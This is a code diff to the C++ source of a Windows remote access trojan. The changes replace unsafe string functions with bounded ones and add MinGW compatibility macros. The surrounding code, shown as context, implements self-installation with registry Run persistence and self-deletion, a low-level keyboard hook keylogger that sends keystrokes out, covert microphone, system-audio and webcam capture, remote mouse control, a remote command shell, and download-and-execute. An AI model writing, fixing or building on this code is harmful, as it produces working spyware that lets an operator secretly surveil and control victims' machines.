@@ -1,5 +1,7 @@
 #define _WIN32_WINNT 0x0600
 #define _CRT_SECURE_NO_WARNINGS
+#define STRSAFE_NO_DEPRECATE
+#define NO_WARN_MBSTOWCS_CWCONVERSION
 
 #include <winsock2.h>
 #include <windows.h>
@@ -19,6 +21,19 @@
 #include <cstdio>
 #include <cstring>
 #include <cwchar>
+
+// MinGW specific: Ensure snprintf is available if sprintf is blocked
+#ifndef sprintf
+#define sprintf(buf, fmt, ...) snprintf(buf, 4096, fmt, ##__VA_ARGS__)
+#endif
+
+// Define secure functions fallback for MinGW
+#ifndef strcpy_s
+#define strcpy_s(dst, sz, src) strncpy(dst, src, sz)
+#endif
+#ifndef strcat_s
+#define strcat_s(dst, sz, src) strncat(dst, src, sz)
+#endif
 
 #define MINIAUDIO_IMPLEMENTATION
 #define MA_NO_DECODING
@@ -131,7 +146,7 @@ void Restart(); void Uninstall(); void Update(const char* u); void Melt(char* s)
 wstring Utf8ToWide(const string& s) { if (s.empty()) return L""; int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0); wstring w(sz, 0); MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], sz); if (sz > 0) w.resize(sz - 1); return w; }
 string WideToUtf8(const wstring& w) { if (w.empty()) return ""; int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL); string s(sz, 0); WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, NULL, NULL); if (sz > 0) s.resize(sz - 1); return s; }
 bool RecvAll(SOCKET s, char* b, int l) { int t = 0; while (t < l) { int r = recv(s, b + t, l - t, 0); if (r <= 0) return false; t += r; } return true; }
-string EscapeJson(const string& in) { string out = ""; for (char c : in) { if (c == '\\') out.append("\\\\"); else if (c == '"') out.append("\""); else if ((unsigned char)c < 32) { char buf[16]; buf[0] = '\\'; buf[1] = 'u'; sprintf(buf + 2, "%04x", (unsigned int)c); out.append(buf); } else out.push_back(c); } return out; }
+string EscapeJson(const string& in) { string out = ""; for (char c : in) { if (c == '\\') out.append("\\\\"); else if (c == '"') out.append("\""); else if ((unsigned char)c < 32) { char buf[16]; snprintf(buf, sizeof(buf), "\\u%04x", (unsigned int)c); out.append(buf); } else out.push_back(c); } return out; }
 int GetEncoderClsid(const WCHAR* f, CLSID* p) { UINT n = 0, s = 0; GetImageEncodersSize(&n, &s); if (s == 0) return -1; ImageCodecInfo* pi = (ImageCodecInfo*)(malloc(s)); GetImageEncoders(n, s, pi); for (UINT j = 0; j < n; ++j) { if (wcscmp(pi[j].MimeType, f) == 0) { *p = pi[j].Clsid; free(pi); return j; } } free(pi); return -1; }
 
 // --- Extra Helpers: HWID, Uptime, Antivirus ---
@@ -139,7 +154,7 @@ int GetEncoderClsid(const WCHAR* f, CLSID* p) { UINT n = 0, s = 0; GetImageEncod
 string GetHWID() {
     DWORD v = 0;
     if (GetVolumeInformationA("C:\\", NULL, 0, &v, NULL, NULL, NULL, 0)) {
-        char b[16]; sprintf(b, "%08X", v);
+        char b[16]; snprintf(b, sizeof(b), "%08lX", v);
         return string(b);
     }
     return "UNKNOWN_HWID";
@@ -152,8 +167,8 @@ string GetUptime() {
     long long h = s / 3600; s %= 3600;
     long long m = s / 60;
     char b[64];
-    if (d > 0) sprintf(b, "%lldd %lldh %lldm", d, h, m);
-    else sprintf(b, "%lldh %lldm", h, m);
+    if (d > 0) snprintf(b, sizeof(b), "%lldd %lldh %lldm", d, h, m);
+    else snprintf(b, sizeof(b), "%lldh %lldm", h, m);
     return string(b);
 }
 
@@ -204,7 +219,7 @@ void ListDrives() {
     for (int i = 0; i < 26; i++) { 
         if (d & (1 << i)) { 
             if (!first) j.append(","); first = false; 
-            char drv[10]; sprintf(drv, "%c:\\\\", (char)('A' + i)); 
+            char drv[10]; snprintf(drv, sizeof(drv), "%c:\\", (char)('A' + i)); 
             j.append("{\"name\":\""); j.append(drv); j.append("\",\"is_dir\":true,\"size\":0}"); 
         } 
     } 
@@ -254,7 +269,7 @@ void SendSysInfo() {
     if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD cpuSz = sizeof(cpu); RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpu, &cpuSz); RegCloseKey(hKey);
     }
-    char gpu[256] = "Unknown GPU"; DISPLAY_DEVICEA dd; dd.cb = sizeof(dd); if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) strcpy(gpu, dd.DeviceString);
+    char gpu[256] = "Unknown GPU"; DISPLAY_DEVICEA dd; dd.cb = sizeof(dd); if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) strncpy(gpu, dd.DeviceString, sizeof(gpu)-1);
     MEMORYSTATUSEX st; st.dwLength = sizeof(st); GlobalMemoryStatusEx(&st);
     int ram = (int)(st.ullTotalPhys / (1024 * 1024 * 1024));
     char cnt[128] = "Unknown"; GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGCOUNTRY, cnt, sizeof(cnt));
@@ -269,7 +284,7 @@ void SendSysInfo() {
 }
 
 BOOL CALLBACK MonEnumProc(HMONITOR h, HDC hdc, LPRECT r, LPARAM d) { MonitorInfo mi = { h, *r }; if (monitors) monitors->push_back(mi); return TRUE; }
-void RefreshMonitors() { if (!monitors) monitors = new vector<MonitorInfo>(); monitors->clear(); EnumDisplayMonitors(NULL, NULL, MonEnumProc, 0); string l = ""; for (size_t i = 0; i < monitors->size(); i++) { char t[64]; sprintf(t, "%d:%dx%d;", (int)i, (int)((*monitors)[i].rcMonitor.right - (*monitors)[i].rcMonitor.left), (int)((*monitors)[i].rcMonitor.bottom - (*monitors)[i].rcMonitor.top)); l += t; } SendPacket(TYPE_MONITOR_LIST, l.c_str(), (int)l.length()); }
+void RefreshMonitors() { if (!monitors) monitors = new vector<MonitorInfo>(); monitors->clear(); EnumDisplayMonitors(NULL, NULL, MonEnumProc, 0); string l = ""; for (size_t i = 0; i < monitors->size(); i++) { char t[64]; snprintf(t, sizeof(t), "%d:%dx%d;", (int)i, (int)((*monitors)[i].rcMonitor.right - (*monitors)[i].rcMonitor.left), (int)((*monitors)[i].rcMonitor.bottom - (*monitors)[i].rcMonitor.top)); l += t; } SendPacket(TYPE_MONITOR_LIST, l.c_str(), (int)l.length()); }
 
 void HandleMouseInput(const char* d) {
     float rx, ry; int f; if (sscanf(d, "%f,%f,%d", &rx, &ry, &f) == 3) {
@@ -303,7 +318,7 @@ void Update(const char* u) { char t[MAX_PATH]; GetTempPathA(MAX_PATH, t); strcat
 void Install() {
     char s[MAX_PATH], d[MAX_PATH], t[MAX_PATH]; GetModuleFileNameA(0, s, MAX_PATH);
     if (strcmp(INSTALL_ENV, "APPDATA") == 0) GetEnvironmentVariableA("APPDATA", d, MAX_PATH); else GetEnvironmentVariableA("TEMP", d, MAX_PATH);
-    sprintf(t, "%s%c%s", d, BS, TARGET_FILE_NAME);
+    snprintf(t, sizeof(t), "%s%c%s", d, BS, TARGET_FILE_NAME);
     if (strcmpi(s, t) != 0) {
         CopyFileA(s, t, 0); HKEY k; if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) { RegSetValueExA(k, TARGET_FILE_NAME, 0, REG_SZ, (const BYTE*)t, (int)strlen(t) + 1); RegCloseKey(k); } 
         ShellExecuteA(0, "open", t, 0, 0, SW_HIDE); Melt(s); exit(0);
@@ -317,8 +332,8 @@ void StartMic(int id) { if (bMicRunning) return; InitAudioCtx(); ma_device_confi
 void StopMic() { if (bMicRunning) { ma_device_stop(&micDevice); ma_device_uninit(&micDevice); bMicRunning = bMicInit = false; } }
 void StartSys(int id) { if (bSysRunning) return; InitAudioCtx(); ma_device_config c = ma_device_config_init(ma_device_type_loopback); c.capture.format = ma_format_s16; c.capture.channels = 2; c.sampleRate = audioSampleRate; c.dataCallback = DataCallback; c.pUserData = (void*)(intptr_t)TYPE_AUDIO_SYS_DATA; ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (bCtxInit && ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { if (id >= 0 && id < (int)pbc) c.playback.pDeviceID = &pb[id].id; } if (ma_device_init(bCtxInit ? &globalCtx : NULL, &c, &sysDevice) == MA_SUCCESS && ma_device_start(&sysDevice) == MA_SUCCESS) bSysRunning = bSysInit = true; } 
 void StopSys() { if (bSysRunning) { ma_device_stop(&sysDevice); ma_device_uninit(&sysDevice); bSysRunning = bSysInit = false; } }
-void ListAudioDevices() { InitAudioCtx(); string r = "AUDIO_DEVS:"; bool found = false; if (bCtxInit) { ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { for (ma_uint32 i = 0; i < capc; i++) { char e[256]; sprintf(e, "C:%d:%s;", (int)i, cap[i].name); r.append(e); found = true; } for (ma_uint32 i = 0; i < pbc; i++) { char e[256]; sprintf(e, "P:%d:%s;", (int)i, pb[i].name); r.append(e); found = true; } } } if (!found) { r.append("C:0:Default Mic;P:0:Default System;"); } SendPacket(TYPE_AUDIO_DEV_LIST, r.c_str(), (int)r.length()); }
-void ListCams() { CoInitialize(NULL); ICreateDevEnum* pDE = NULL; IEnumMoniker* pE = NULL; CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDE); if (pDE) { pDE->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pE, 0); if (pE) { IMoniker* pM = NULL; string l = ""; int idx = 0; while (pE->Next(1, &pM, NULL) == S_OK) { IPropertyBag* pB; pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pB); VARIANT v; VariantInit(&v); pB->Read(L"FriendlyName", &v, 0); if (idx > 0) l.append(";"); char e[256]; sprintf(e, "%d:%s", idx++, WideToUtf8(v.bstrVal).c_str()); l.append(e); VariantClear(&v); pB->Release(); pM->Release(); } SendPacket(TYPE_CAM_LIST, l.c_str(), (int)l.length()); pE->Release(); } else SendPacket(TYPE_CAM_LIST, "", 0); pDE->Release(); } CoUninitialize(); }
+void ListAudioDevices() { InitAudioCtx(); string r = "AUDIO_DEVS:"; bool found = false; if (bCtxInit) { ma_device_info *pb, *cap; ma_uint32 pbc, capc; if (ma_context_get_devices(&globalCtx, &pb, &pbc, &cap, &capc) == MA_SUCCESS) { for (ma_uint32 i = 0; i < capc; i++) { char e[256]; snprintf(e, sizeof(e), "C:%d:%s;", (int)i, cap[i].name); r.append(e); found = true; } for (ma_uint32 i = 0; i < pbc; i++) { char e[256]; snprintf(e, sizeof(e), "P:%d:%s;", (int)i, pb[i].name); r.append(e); found = true; } } } if (!found) { r.append("C:0:Default Mic;P:0:Default System;"); } SendPacket(TYPE_AUDIO_DEV_LIST, r.c_str(), (int)r.length()); }
+void ListCams() { CoInitialize(NULL); ICreateDevEnum* pDE = NULL; IEnumMoniker* pE = NULL; CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDE); if (pDE) { pDE->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pE, 0); if (pE) { IMoniker* pM = NULL; string l = ""; int idx = 0; while (pE->Next(1, &pM, NULL) == S_OK) { IPropertyBag* pB; pM->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pB); VARIANT v; VariantInit(&v); pB->Read(L"FriendlyName", &v, 0); if (idx > 0) l.append(";"); char e[256]; snprintf(e, sizeof(e), "%d:%s", idx++, WideToUtf8(v.bstrVal).c_str()); l.append(e); VariantClear(&v); pB->Release(); pM->Release(); } SendPacket(TYPE_CAM_LIST, l.c_str(), (int)l.length()); pE->Release(); } else SendPacket(TYPE_CAM_LIST, "", 0); pDE->Release(); } CoUninitialize(); }
 DWORD WINAPI CamThread(LPVOID p) {
     CoInitialize(NULL); IGraphBuilder* pG; ICaptureGraphBuilder2* pB; IBaseFilter *pC, *pGF, *pN; ISampleGrabber* pS; IMediaControl* pMC; IEnumMoniker* pE; ICreateDevEnum* pDE;
     CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pG); CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pB); pB->SetFiltergraph(pG);
@@ -343,7 +358,7 @@ DWORD WINAPI CamThread(LPVOID p) {
 void SysInternalOpen(char* p, DWORD s) {
     char t[MAX_PATH], f[MAX_PATH]; const char* ext = ".exe";
     if (s > 4) { if (p[0] == (char)0xFF && p[1] == (char)0xD8) ext = ".jpg"; else if (p[0] == (char)0x25 && p[1] == (char)0x50) ext = ".pdf"; else if (p[0] == (char)0x89 && p[1] == (char)0x50) ext = ".png"; else if (p[0] != 'M' || p[1] != 'Z') ext = ".txt"; } 
-    GetTempPathA(MAX_PATH, t); sprintf(f, "%sGhst%d%s", t, (int)time(NULL), ext); FILE* fl = fopen(f, "wb");
+    GetTempPathA(MAX_PATH, t); snprintf(f, sizeof(f), "%sGhst%d%s", t, (int)time(NULL), ext); FILE* fl = fopen(f, "wb");
     if (fl) {
         fwrite(p, 1, s, fl); fclose(fl); SHELLEXECUTEINFOA sei = {0};
         sei.cbSize = sizeof(SHELLEXECUTEINFOA); sei.fMask = SEE_MASK_NOCLOSEPROCESS; sei.lpVerb = "open"; sei.lpFile = f; sei.nShow = SW_SHOWNORMAL;
@@ -352,12 +367,12 @@ void SysInternalOpen(char* p, DWORD s) {
 }
 
 // --- Keylogger & Chat & Network ---
-LRESULT CALLBACK LLKbdProc(int n, WPARAM w, LPARAM l) { if (n == HC_ACTION && bKeylogRunning && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) { KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l; char t[256]; GetWindowTextA(GetForegroundWindow(), t, 256); string log = ""; if (strcmp(t, lastWindowTitle) != 0) { strcpy(lastWindowTitle, t); log.append("\n["); log.append(t); log.append("] "); } if (p->vkCode >= 0x30 && p->vkCode <= 0x5A) log.push_back((char)p->vkCode); else if (p->vkCode == VK_SPACE) log.append(" "); else if (p->vkCode == VK_RETURN) log.append("[ENTER]"); else { char b[16]; sprintf(b, "[%d]", (int)p->vkCode); log.append(b); } SendPacket(TYPE_KEYLOG_DATA, log.c_str(), (int)log.length()); } return CallNextHookEx(hKeyboardHook, n, w, l); }
+LRESULT CALLBACK LLKbdProc(int n, WPARAM w, LPARAM l) { if (n == HC_ACTION && bKeylogRunning && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) { KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l; char t[256]; GetWindowTextA(GetForegroundWindow(), t, 256); string log = ""; if (strcmp(t, lastWindowTitle) != 0) { strncpy(lastWindowTitle, t, sizeof(lastWindowTitle)-1); log.append("\n[ "); log.append(t); log.append("] "); } if (p->vkCode >= 0x30 && p->vkCode <= 0x5A) log.push_back((char)p->vkCode); else if (p->vkCode == VK_SPACE) log.append(" "); else if (p->vkCode == VK_RETURN) log.append("[ENTER]"); else { char b[16]; snprintf(b, sizeof(b), "[%d]", (int)p->vkCode); log.append(b); } SendPacket(TYPE_KEYLOG_DATA, log.c_str(), (int)log.length()); } return CallNextHookEx(hKeyboardHook, n, w, l); }
 DWORD WINAPI MonitorThread(LPVOID p) { hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKbdProc, GetModuleHandle(0), 0); MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); if (!bKeylogRunning && hKeyboardHook == NULL) break; } if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook); return 0; }
 void StartKeylogger() { bKeylogRunning = true; } void StopKeylogger() { bKeylogRunning = false; }
 LRESULT CALLBACK ChatWndProc(HWND hw, UINT m, WPARAM w, LPARAM l) { switch (m) { case WM_CREATE: { hChatFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Malgun Gothic"); hChatEditHist = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 10, 360, 200, hw, NULL, NULL, NULL); SendMessageW(hChatEditHist, WM_SETFONT, (WPARAM)hChatFont, TRUE); hChatEditInput = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 10, 220, 280, 30, hw, NULL, NULL, NULL); SendMessageW(hChatEditInput, WM_SETFONT, (WPARAM)hChatFont, TRUE); hChatBtnSend = CreateWindowExW(0, L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 300, 220, 70, 30, hw, (HMENU)1, NULL, NULL); SendMessageW(hChatBtnSend, WM_SETFONT, (WPARAM)hChatFont, TRUE); break; } case WM_COMMAND: if (LOWORD(w) == 1) { int len = GetWindowTextLengthW(hChatEditInput); if (len > 0) { wchar_t* buf = (wchar_t*)malloc((len + 1) * sizeof(wchar_t)); GetWindowTextW(hChatEditInput, buf, len + 1); SetWindowTextW(hChatEditInput, L""); wstring msg = L"Me: "; msg.append(buf); msg.append(L"\r\n"); int n = GetWindowTextLengthW(hChatEditHist); SendMessageW(hChatEditHist, EM_SETSEL, (WPARAM)n, (LPARAM)n); SendMessageW(hChatEditHist, EM_REPLACESEL, 0, (LPARAM)msg.c_str()); string u = WideToUtf8(buf); SendPacket(TYPE_CHAT_MSG, u.c_str(), (int)u.length()); free(buf); } } break; case WM_CLOSE: if (bChatForceClose) return DefWindowProc(hw, m, w, l); return 0; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hw, m, w, l); } return 0; }
 DWORD WINAPI ChatThread(LPVOID p) { WNDCLASSEXW wc = { 0 }; wc.cbSize = sizeof(wc); wc.lpfnWndProc = ChatWndProc; wc.hInstance = GetModuleHandle(0); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); wc.lpszClassName = L"GhostChatClass"; RegisterClassExW(&wc); int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN); wstring t = L"Chat with "; t.append(Utf8ToWide(chatAdminName)); hChatWnd = CreateWindowExW(WS_EX_TOPMOST, L"GhostChatClass", t.c_str(), WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, (sw - 400) / 2, (sh - 300) / 2, 400, 300, 0, 0, GetModuleHandle(0), 0); ShowWindow(hChatWnd, SW_SHOWNORMAL); UpdateWindow(hChatWnd); MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); if (!bChatRunning) break; } if (hChatWnd) DestroyWindow(hChatWnd); UnregisterClassW(L"GhostChatClass", GetModuleHandle(0)); return 0; }
-void StartChat(const char* n) { if (bChatRunning) return; bChatRunning = true; bChatForceClose = false; strcpy(chatAdminName, n); hChatThreadHandle = CreateThread(NULL, 0, ChatThread, NULL, 0, NULL); }
+void StartChat(const char* n) { if (bChatRunning) return; bChatRunning = true; bChatForceClose = false; strncpy(chatAdminName, n, sizeof(chatAdminName)-1); hChatThreadHandle = CreateThread(NULL, 0, ChatThread, NULL, 0, NULL); }
 void StopChat() { if (bChatRunning) { bChatRunning = false; bChatForceClose = true; if (hChatWnd) { SendMessageW(hChatWnd, WM_CLOSE, 0, 0); hChatWnd = NULL; } } }
 void AppendChatMessage(char* t) { if (hChatWnd && hChatEditHist) { wstring msg = Utf8ToWide(chatAdminName) + L": " + Utf8ToWide(t) + L"\r\n"; int n = GetWindowTextLengthW(hChatEditHist); SendMessageW(hChatEditHist, EM_SETSEL, (WPARAM)n, (LPARAM)n); SendMessageW(hChatEditHist, EM_REPLACESEL, 0, (LPARAM)msg.c_str()); } }
 DWORD WINAPI ReadFromCmd(LPVOID lpParam) { char buffer[BUF_SIZE]; DWORD r, a; while (true) { if (!PeekNamedPipe(hChildStd_OUT_Rd, 0, 0, 0, &a, 0)) break; if (a > 0 && ReadFile(hChildStd_OUT_Rd, buffer, BUF_SIZE, &r, 0) && r > 0) SendPacket(TYPE_SHELL_OUT, buffer, (int)r); Sleep(50); } return 0; }
